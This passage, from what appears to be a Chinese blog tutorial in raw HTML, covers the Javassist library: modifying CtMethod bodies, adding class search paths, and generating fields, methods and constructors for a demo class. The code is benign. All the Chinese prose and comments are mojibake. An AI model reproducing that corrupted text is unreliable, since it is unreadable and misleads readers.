ç±»çš„å­—èŠ‚ç æ–‡ä»¶</span><br><span class="hljs-type">ClassFile</span> <span class="hljs-variable">classFile</span> <span class="hljs-operator">=</span> ctClass.getClassFile();<br><span class="hljs-comment">// ç¼–è¯‘æˆå­—èŠ‚ç æ–‡ä»¶, ä½¿ç”¨å½“å‰çº¿ç¨‹ä¸Šä¸‹æ–‡ç±»åŠ è½½å™¨åŠ è½½ç±», å¦‚æœç±»å·²å­˜åœ¨æˆ–è€…ç¼–è¯‘å¤±è´¥å°†æŠ›å‡ºå¼‚å¸¸</span><br><span class="hljs-type">byte</span>[] bytes = ctClass.toBytecode();<br></code></pre></td></tr></table></figure><h1><span id="ctmethodç›¸å…³æ–¹æ³•">CtMethodç›¸å…³æ–¹æ³•</span></h1><p><code>CtMthod</code>ä»£è¡¨ç±»ä¸­çš„æŸä¸ªæ–¹æ³•ï¼Œå¯ä»¥é€šè¿‡<code>CtClass</code>æä¾›çš„APIè·å–æˆ–è€…<code>CtNewMethod</code>æ–°å»ºï¼Œé€šè¿‡<code>CtMethod</code>å¯¹è±¡å¯ä»¥å®ç°å¯¹æ–¹æ³•çš„ä¿®æ”¹ã€‚</p><p>CtNewMethodæœ‰ç‚¹ç±»ä¼¼ä¸€ä¸ªå·¥å…·ç±»ï¼Œé‡Œé¢çš„æ–¹æ³•éƒ½æ˜¯é™æ€æ–¹æ³•ï¼Œæ¯”å¦‚ç”Ÿæˆä¸€ä¸ªæ–°çš„CtMethod</p><p><img src="https://cdn.clown2024.cn/202409060034713.png" alt="image-20240906003402632"></p><ul><li><p>insertBefore : åœ¨æ–¹æ³•çš„èµ·å§‹ä½ç½®æ’å…¥ä»£ç ï¼›</p></li><li><p>insterAfter : åœ¨æ–¹æ³•çš„æ‰€æœ‰ return è¯­å¥å‰æ’å…¥ä»£ç ä»¥ç¡®ä¿è¯­å¥èƒ½å¤Ÿè¢«æ‰§è¡Œï¼Œé™¤éé‡åˆ°exceptionï¼›</p></li><li><p>insertAt : åœ¨æŒ‡å®šçš„ä½ç½®æ’å…¥ä»£ç ï¼›</p></li><li><p>setBody: å°†æ–¹æ³•çš„å†…å®¹è®¾ç½®ä¸ºè¦å†™å…¥çš„ä»£ç ï¼Œå½“æ–¹æ³•è¢« abstractä¿®é¥°æ—¶ï¼Œè¯¥ä¿®é¥°ç¬¦è¢«ç§»é™¤ï¼›</p></li><li><p>make : åˆ›å»ºä¸€ä¸ªæ–°çš„æ–¹æ³•ï¼Œæœ¬è´¨å°±æ˜¯è°ƒç”¨CtNewMethod#make</p><p><img src="https://cdn.clown2024.cn/202409060035377.png" alt="image-20240906003533328"></p></li></ul><h2><span id="ctmethodå±æ€§è·å–">CtMethodå±æ€§è·å–</span></h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass5</span> <span class="hljs-operator">=</span> pool.get(TestService.class.getName());<br><span class="hljs-type">CtMethod</span> <span class="hljs-variable">ctMethod</span> <span class="hljs-operator">=</span> ctClass5.getDeclaredMethod(<span class="hljs-string">&quot;selectOrder&quot;</span>);<br><span class="hljs-comment">// æ–¹æ³•å</span><br><span class="hljs-type">String</span> <span class="hljs-variable">methodName</span> <span class="hljs-operator">=</span> ctMethod.getName();<br><span class="hljs-comment">// è¿”å›ç±»å‹</span><br><span class="hljs-type">CtClass</span> <span class="hljs-variable">returnType</span> <span class="hljs-operator">=</span> ctMethod.getReturnType();<br><span class="hljs-comment">// æ–¹æ³•å‚æ•°, é€šè¿‡æ­¤ç§æ–¹å¼å¾—åˆ°æ–¹æ³•å‚æ•°åˆ—è¡¨</span><br><span class="hljs-comment">// æ ¼å¼: com.kawa.TestService.getOrder(java.lang.String,java.util.List)</span><br>ctMethod.getLongName();<br><span class="hljs-comment">// æ–¹æ³•ç­¾å æ ¼å¼: (Ljava/lang/String;Ljava/util/List;Lcom/test/Order;)Ljava/lang/Integer;</span><br>ctMethod.getSignature();<br><br><span class="hljs-comment">// è·å–æ–¹æ³•å‚æ•°åç§°, å¯ä»¥é€šè¿‡è¿™ç§æ–¹å¼å¾—åˆ°æ–¹æ³•çœŸå®å‚æ•°åç§°</span><br>List&lt;String&gt; argKeys = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br><span class="hljs-type">MethodInfo</span> <span class="hljs-variable">methodInfo</span> <span class="hljs-operator">=</span> ctMethod.getMethodInfo();<br><span class="hljs-type">CodeAttribute</span> <span class="hljs-variable">codeAttribute</span> <span class="hljs-operator">=</span> methodInfo.getCodeAttribute();<br><span class="hljs-type">LocalVariableAttribute</span> <span class="hljs-variable">attr</span> <span class="hljs-operator">=</span> (LocalVariableAttribute) codeAttribute.getAttribute(LocalVariableAttribute.tag);<br><span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> ctMethod.getParameterTypes().length;<br><span class="hljs-comment">// éé™æ€çš„æˆå‘˜å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯this</span><br><span class="hljs-type">int</span> <span class="hljs-variable">pos</span> <span class="hljs-operator">=</span> Modifier.isStatic(ctMethod.getModifiers()) ? <span class="hljs-number">0</span> : <span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> pos; i &lt; len; i++) &#123;<br>    argKeys.add(attr.variableName(i));<br>&#125;<br></code></pre></td></tr></table></figure><h2><span id="ctmethodæ–¹æ³•ä½“ä¿®æ”¹">CtMethodæ–¹æ³•ä½“ä¿®æ”¹</span></h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// åœ¨æ–¹æ³•ä½“å‰æ’å…¥ä»£ç å—</span><br>ctMethod.insertBefore(<span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-comment">// åœ¨æ–¹æ³•ä½“åæ’å…¥ä»£ç å—</span><br>ctMethod.insertAfter(<span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-comment">// åœ¨æŸè¡Œ å­—èŠ‚ç  åæ’å…¥ä»£ç å—</span><br>ctMethod.insertAt(<span class="hljs-number">10</span>, <span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-comment">// æ·»åŠ å‚æ•°</span><br>ctMethod.addParameter(CtClass);<br><span class="hljs-comment">// è®¾ç½®æ–¹æ³•å</span><br>ctMethod.setName(<span class="hljs-string">&quot;newName&quot;</span>);<br><span class="hljs-comment">// è®¾ç½®æ–¹æ³•ä½“ $0=this / $1,$2,$3... ä»£è¡¨æ–¹æ³•å‚æ•°</span><br>ctMethod.setBody(<span class="hljs-string">&quot;&#123;$0.name = $1;&#125;&quot;</span>);<br><span class="hljs-comment">//åˆ›å»ºä¸€ä¸ªæ–°çš„æ–¹æ³•</span><br>ctMethod.make(<span class="hljs-string">&quot;kawa&quot;</span>,CtClass);<br></code></pre></td></tr></table></figure><h2><span id="å¼‚å¸¸å—æ·»åŠ ">å¼‚å¸¸å—æ·»åŠ </span></h2><p>åœ¨æ–¹æ³•ä¸­åŠ å…¥try catchå—, éœ€è¦æ³¨æ„çš„æ˜¯, å¿…é¡»åœ¨æ’å…¥çš„ä»£ç ä¸­, åŠ å…¥returnå€¼$eä»£è¡¨å¼‚å¸¸ä¿¡æ¯.æ’å…¥çš„ä»£ç ç‰‡æ®µå¿…é¡»ä»¥throwæˆ–returnè¯­å¥ç»“æŸ</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">CtMethod</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> ...;<br><span class="hljs-type">CtClass</span> <span class="hljs-variable">etype</span> <span class="hljs-operator">=</span> ClassPool.getDefault().get(<span class="hljs-string">&quot;java.io.IOException&quot;</span>);<br>m.addCatch(<span class="hljs-string">&quot;&#123; System.out.println($e); throw $e; &#125;&quot;</span>, etype);<br><span class="hljs-comment">// ç­‰åŒäºæ·»åŠ å¦‚ä¸‹ä»£ç : </span><br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-comment">// the original method body</span><br>&#125; <span class="hljs-keyword">catch</span> (java.io.IOException e) &#123;<br>    System.out.println(e);<br>    <span class="hljs-keyword">throw</span> e;<br>&#125;<br></code></pre></td></tr></table></figure><h1><span id="ç±»æœç´¢è·¯å¾„">ç±»æœç´¢è·¯å¾„</span></h1><p>æˆ‘ä»¬å‰é¢è·å–çš„ClassPoolä»–æœ‰è‡ªå·±çš„ç±»æœç´¢è·¯å¾„ï¼Œå¦‚æœç¨‹åºè¿è¡Œåœ¨JBossæˆ–Tomcatç­‰webæœåŠ¡å™¨ä¸Šï¼Œå¯èƒ½ä¼šæ‰¾ä¸åˆ°ç”¨æˆ·è‡ªå·±çš„ç±»ï¼Œæˆ‘ä»¬éœ€è¦æ‰‹åŠ¨æ·»åŠ ä¸€ä¸ªç±»æœç´¢è·¯å¾„ã€‚</p><p>ä¸‹é¢æ˜¯å„ç§æ·»åŠ ç±»æœç´ è·¯å¾„çš„å„ç§æ–¹å¼</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*é€šè¿‡ClassClassPathæ·»åŠ è·¯å¾„*/</span><br><span class="hljs-comment">// å°†classpathæ’å…¥åˆ°æŒ‡å®šclasspathä¹‹å‰</span><br>pool.insertClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(Student.getClass()));<br><span class="hljs-comment">// å°†classpathæ·»åŠ åˆ°æŒ‡å®šclasspathä¹‹å</span><br>pool.appendClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(<span class="hljs-built_in">this</span>.getClass()));<br></code></pre></td></tr></table></figure><blockquote><p>è¯¥æ–¹å¼æ·»åŠ çš„æ—¶å€™ï¼Œæ¯”å¦‚ä¸Šé¢çš„Student.classï¼Œå¯ä»¥å°†classæ‰€åœ¨çš„æ•´ä¸ªjaræ·»åŠ åˆ°æœç´¢è·¯å¾„</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*æŒ‡å®šç›®å½•æ·»åŠ æœç´¢è·¯å¾„*/</span><br><span class="hljs-comment">// å°†ä¸€ä¸ªç›®å½•ä½œä¸ºclasspath</span><br>pool.insertClassPath(<span class="hljs-string">&quot;/xxx/lib&quot;</span>);<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*é€šè¿‡urlæŒ‡å®šæœç´¢è·¯å¾„*/</span><br><span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><span class="hljs-type">ClassPath</span> <span class="hljs-variable">cp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLClassPath</span>(<span class="hljs-string">&quot;www.sample.com&quot;</span>, <span class="hljs-number">80</span>, <span class="hljs-string">&quot;/out/&quot;</span>, <span class="hljs-string">&quot;com.test&quot;</span>);<br>pool.insertClassPath(cp);<br></code></pre></td></tr></table></figure><blockquote><p>ä¸Šè¿°ä»£ç å°†<a href="http://www.sample.com/out%E6%B7%BB%E5%8A%A0%E5%88%B0%E7%B1%BB%E6%90%9C%E7%B4%A2%E8%B7%AF%E5%BE%84%E3%80%82%E5%B9%B6%E4%B8%94%E8%BF%99%E4%B8%AAURL%E5%8F%AA%E8%83%BD%E6%90%9C%E7%B4%A2%60com.test%60%E5%8C%85%E9%87%8C%E9%9D%A2%E7%9A%84%E7%B1%BB%E3%80%82">http://www.sample.com:80/outæ·»åŠ åˆ°ç±»æœç´¢è·¯å¾„ã€‚å¹¶ä¸”è¿™ä¸ªURLåªèƒ½æœç´¢`com.test`åŒ…é‡Œé¢çš„ç±»ã€‚</a></p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*é€šè¿‡ByteArrayPathæ·»åŠ æœç´¢è·¯å¾„*/</span><br><span class="hljs-type">ClassPool</span> <span class="hljs-variable">cp</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><span class="hljs-type">byte</span>[] buf = å­—èŠ‚æ•°ç»„;<br><span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> ç±»å;<br>cp.insertClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayClassPath</span>(name, buf));<br><span class="hljs-type">CtClass</span> <span class="hljs-variable">cc</span> <span class="hljs-operator">=</span> cp.get(name);<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*é€šè¿‡è¾“å…¥æµåŠ è½½class*/</span><br><span class="hljs-type">ClassPool</span> <span class="hljs-variable">cp</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><span class="hljs-type">InputStream</span> <span class="hljs-variable">ins</span> <span class="hljs-operator">=</span>  classæ–‡ä»¶å¯¹åº”çš„è¾“å…¥æµ;<br><span class="hljs-type">CtClass</span> <span class="hljs-variable">cc</span> <span class="hljs-operator">=</span> cp.makeClass(ins);<br></code></pre></td></tr></table></figure><h1><span id="è¯»å†™å­—èŠ‚ç ">è¯»å†™å­—èŠ‚ç </span></h1><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><span class="hljs-type">CtClass</span> <span class="hljs-variable">cc</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;test.Rectangle&quot;</span>);<br></code></pre></td></tr></table></figure><blockquote><p><code>ClassPool</code>çš„<code>getDefault()</code>æ–¹æ³•å°†ä¼šæŸ¥æ‰¾ç³»ç»Ÿé»˜è®¤çš„è·¯å¾„æ¥æœç´¢<code>test.Rectable</code>å¯¹è±¡ï¼Œç„¶åå°†è·å–åˆ°çš„<code>CtClass</code>å¯¹è±¡èµ‹å€¼ç»™ccå˜é‡ï¼Œå¦‚æœå¯¹è±¡æ²¡æœ‰è¢«æ‰¾åˆ°ï¼Œé‚£ä¹ˆ<code>get()</code>æ–¹æ³•å°±ä¼šåˆ›å»ºå‡ºä¸€ä¸ªé»˜è®¤çš„<code>CtClass</code>å¯¹è±¡ï¼Œç„¶åæ”¾å…¥åˆ°<code>HashTable</code>ä¸­ï¼ŒåŒæ—¶å°†å½“å‰åˆ›å»ºçš„å¯¹è±¡è¿”å›ã€‚</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">byte</span>[] b = cc.toBytecode(); <span class="hljs-comment">//ç›´æ¥è·å–å­—èŠ‚ç </span><br><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> cc.toClass(); <span class="hljs-comment">//è·å–Class</span><br></code></pre></td></tr></table></figure><p><code>toClass()</code>æ–¹æ³•è°ƒç”¨ä½¿å¾—å½“å‰çº¿ç¨‹ä¸­çš„context class loaderåŠ è½½æ­¤CtClassç±»ï¼Œç„¶åç”Ÿæˆ<code>java.lang.Class</code>å¯¹è±¡ã€‚</p><h1><span id="å¯¹ç±»çš„ç›¸å…³æ“ä½œ">å¯¹ç±»çš„ç›¸å…³æ“ä½œ</span></h1><p>ä¸»è¦è¿˜æ˜¯å­¦ä¸€ä¸‹å…·ä½“çš„ä½¿ç”¨ï¼Œå¤ªæ·±å…¥çš„ä¸œè¥¿å…ˆä¸çœ‹ï¼Œå‚è€ƒæ–‡ç« ï¼š<a href="https://blog.csdn.net/weixin_54902210/article/details/129562446">https://blog.csdn.net/weixin_54902210/article/details/129562446</a></p><p>è¿™é‡ŒåŸºäºå‰é¢åˆ›å»ºçš„Helloç±»è¿›è¡Œæ“ä½œ</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">ClassPool</span> <span class="hljs-variable">cp</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> cp.makeClass(<span class="hljs-string">&quot;Temp.Hello&quot;</span>);<br>ctClass.writeFile();<br></code></pre></td></tr></table></figure><h2><span id="æ·»åŠ å±æ€§">æ·»åŠ å±æ€§</span></h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.ssist;<br><br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtField;<br><span class="hljs-keyword">import</span> javassist.Modifier;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">demo2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//1.åˆ›å»ºHelloç±»</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.makeClass(<span class="hljs-string">&quot;Temp.Hello&quot;</span>);<br><br>        <span class="hljs-comment">//2.æ·»åŠ å±æ€§</span><br>        <span class="hljs-type">CtField</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtField</span>(classPool.get(<span class="hljs-string">&quot;java.lang.String&quot;</span>), <span class="hljs-string">&quot;name&quot;</span>, ctClass);<br>        name.setModifiers(Modifier.PUBLIC);<span class="hljs-comment">//è®¾ç½®å±æ€§ä¸ºpublic</span><br>        ctClass.addField(name,CtField.Initializer.constant(<span class="hljs-string">&quot;Sentiment&quot;</span>));<span class="hljs-comment">//ç»™nameå˜é‡åˆå§‹åŒ–å€¼Sentiment</span><br>        ctClass.writeFile();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409071630618.png" alt="image-20240907163059547"></p><p>èµ‹å€¼ä¹Ÿå¯ä»¥è¿™æ ·</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">ctClass.addField(name,<span class="hljs-string">&quot;name=\&quot;Sentiment\&quot;&quot;</span>);<br></code></pre></td></tr></table></figure><p>ä½†è¿™ç§èµ‹å€¼åå‘äºç”¨æ„é€ å™¨ç­‰è¿›è¡Œåˆå§‹åŒ–</p><h2><span id="æ·»åŠ æ–¹æ³•">æ·»åŠ æ–¹æ³•</span></h2><p>æ–¹æ³•å¯ä»¥è®¾ç½®çš„è¿”å›ç±»å‹</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass booleanType;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass charType;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass byteType;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass shortType;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass intType;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass longType;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass floatType;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass doubleType;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass voidType;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œä¸æ”¯æŒç›´æ¥ç”¨Stringï¼Œæ˜¯å› ä¸ºåœ¨javaå­—èŠ‚ç ä¸­ï¼Œå‚æ•°å’Œè¿”å›ç±»å‹çš„Stringä¸€èˆ¬éƒ½æ˜¯ç”¨å¸¸é‡æ± ä¸­å­—ç¬¦ä¸²çš„ç´¢å¼•å€¼ï¼Œè¦è®¾ç½®Stringç±»å‹çš„è¯å°±å’Œå‰é¢ä¸€æ ·ç”¨<strong>classPool.getCtClass(â€œjava.lang.Stringâ€)</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.ssist;<br><br><span class="hljs-keyword">import</span> javassist.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">demo2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//1.åˆ›å»ºHelloç±»</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.makeClass(<span class="hljs-string">&quot;Temp.Hello&quot;</span>);<br><br>        <span class="hljs-comment">//2.æ·»åŠ å±æ€§</span><br>        <span class="hljs-type">CtField</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtField</span>(classPool.get(<span class="hljs-string">&quot;java.lang.String&quot;</span>), <span class="hljs-string">&quot;name&quot;</span>, ctClass);<br>        name.setModifiers(Modifier.PUBLIC);<span class="hljs-comment">//è®¾ç½®å±æ€§ä¸ºpublic</span><br>        ctClass.addField(name,CtField.Initializer.constant(<span class="hljs-string">&quot;Sentiment&quot;</span>));<span class="hljs-comment">//ç»™nameå˜é‡åˆå§‹åŒ–å€¼Sentiment</span><br><br>        <span class="hljs-comment">//3.æ·»åŠ æ–¹æ³•</span><br>        <span class="hljs-type">CtMethod</span> <span class="hljs-variable">test</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtMethod</span>(CtClass.voidType, <span class="hljs-string">&quot;Test&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;CtClass.intType, CtClass.charType&#125;, ctClass);<span class="hljs-comment">//åˆ†åˆ«æ˜¯è¿”å›ç±»å‹ï¼Œæ–¹æ³•åï¼Œæ–¹æ³•å‚æ•°ï¼Œè¦æ·»åŠ çš„æ–¹æ³•çš„CtClass</span><br>        ctClass.setModifiers(Modifier.PUBLIC);<span class="hljs-comment">//è®¾ç½®æ–¹æ³•ä¸ºpublic</span><br>        ctClass.addMethod(test);<br>        ctClass.writeFile();<br><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409071700312.png" alt="image-20240907170022235"></p><h3><span id="è®¾ç½®æ–¹æ³•ä½“">è®¾ç½®æ–¹æ³•ä½“</span></h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.ssist;<br><br><span class="hljs-keyword">import</span> javassist.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">demo2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//1.åˆ›å»ºHelloç±»</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.makeClass(<span class="hljs-string">&quot;Temp.Hello&quot;</span>);<br><br>        <span class="hljs-comment">//2.æ·»åŠ å±æ€§</span><br>        <span class="hljs-type">CtField</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtField</span>(classPool.get(<span class="hljs-string">&quot;java.lang.String&quot;</span>), <span class="hljs-string">&quot;name&quot;</span>, ctClass);<br>        name.setModifiers(Modifier.PUBLIC);<span class="hljs-comment">//è®¾ç½®å±æ€§ä¸ºpublic</span><br>        ctClass.addField(name,CtField.Initializer.constant(<span class="hljs-string">&quot;Sentiment&quot;</span>));<span class="hljs-comment">//ç»™nameå˜é‡åˆå§‹åŒ–å€¼Sentiment</span><br><span class="hljs-comment">//        ctClass.writeFile();</span><br><br>        <span class="hljs-comment">//3.æ·»åŠ æ–¹æ³•</span><br>        <span class="hljs-type">CtMethod</span> <span class="hljs-variable">test</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtMethod</span>(CtClass.voidType, <span class="hljs-string">&quot;Test&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;CtClass.intType, CtClass.charType&#125;, ctClass);<span class="hljs-comment">//åˆ†åˆ«æ˜¯è¿”å›ç±»å‹ï¼Œæ–¹æ³•åï¼Œæ–¹æ³•å‚æ•°ï¼Œè¦æ·»åŠ çš„æ–¹æ³•çš„CtClass</span><br>        ctClass.setModifiers(Modifier.PUBLIC);<span class="hljs-comment">//è®¾ç½®æ–¹æ³•ä¸ºpublic</span><br>        ctClass.addMethod(test);<br><span class="hljs-comment">//        ctClass.writeFile();</span><br><br>        <span class="hljs-comment">//4.è®¾ç½®æ–¹æ³•ä½“</span><br>        test.setBody(<span class="hljs-string">&quot;System.out.println(\&quot;Hello World\&quot;);&quot;</span>);<br>        ctClass.writeFile();<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409071702140.png" alt="image-20240907170209069"></p><h3><span id="æ–¹æ³•ä½“å‰åæ’å…¥ä»£ç ">æ–¹æ³•ä½“å‰åæ’å…¥ä»£ç </span></h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">test.insertBefore(<span class="hljs-string">&quot;System.out.println(\&quot;æˆ‘åœ¨å‰é¢æ’å…¥:\&quot;+$1);&quot;</span>);<br>test.insertAfter(<span class="hljs-string">&quot;System.out.println(\&quot;æˆ‘åœ¨åé¢æ’å…¥äº†:\&quot;+$2);&quot;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409071704977.png" alt="image-20240907170453863"></p><h2><span id="æ·»åŠ æ„é€ å™¨">æ·»åŠ æ„é€ å™¨</span></h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">CtConstructor</span> <span class="hljs-variable">cons</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;classPool.getCtClass(<span class="hljs-string">&quot;java.lang.String&quot;</span>)&#125;, ctClass);<span class="hljs-comment">//åˆ†åˆ«æ˜¯å‚æ•°åˆ—è¡¨ï¼Œè¦æ·»åŠ çš„CtClass</span><br>cons.setBody(<span class="hljs-string">&quot;&#123;$0.name = $1;&#125;&quot;</span>);<span class="hljs-comment">//è®¾ç½®name=var1ï¼Œä¹Ÿå°±æ˜¯ç¬¬ä¸€ä¸ªå‚æ•°</span><br>ctClass.addConstructor(cons);<br>ctClass.writeFile();<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409071713061.png" alt="image-20240907171307942"></p><blockquote><p>æ— å‚æ„é€ å»æ‰ä¸­é—´çš„å‚æ•°å³å¯</p></blockquote><h2><span id="ä¿®æ”¹å·²æœ‰ç±»">ä¿®æ”¹å·²æœ‰ç±»</span></h2><p>ç”¨ClassPoolè·å–CtClassä¹‹åè¿›è¡Œä¿®æ”¹ï¼Œæˆ‘ä»¬å¯¹æˆ‘ä»¬æˆ‘ä»¬å‰é¢åˆ›å»ºçš„Hello.classè¿›è¡Œä¿®æ”¹</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.ssist;<br><br><br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">demo3</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//å¯¹å·²æœ‰ç±»è¿›è¡Œä¿®æ”¹</span><br>        System.out.println(System.getProperty(<span class="hljs-string">&quot;user.dir&quot;</span>));<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        classPool.insertClassPath(<span class="hljs-string">&quot;D:\\CTF\\Java\\JavaCode\\JavassistLearn&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.getCtClass(<span class="hljs-string">&quot;Temp.Hello&quot;</span>);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> ctClass.getConstructors()[<span class="hljs-number">0</span>];<br>        constructor.setBody(<span class="hljs-string">&quot;&#123;System.out.println(\&quot;changing\&quot;);&#125;&quot;</span>);<br>        ctClass.writeFile();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img 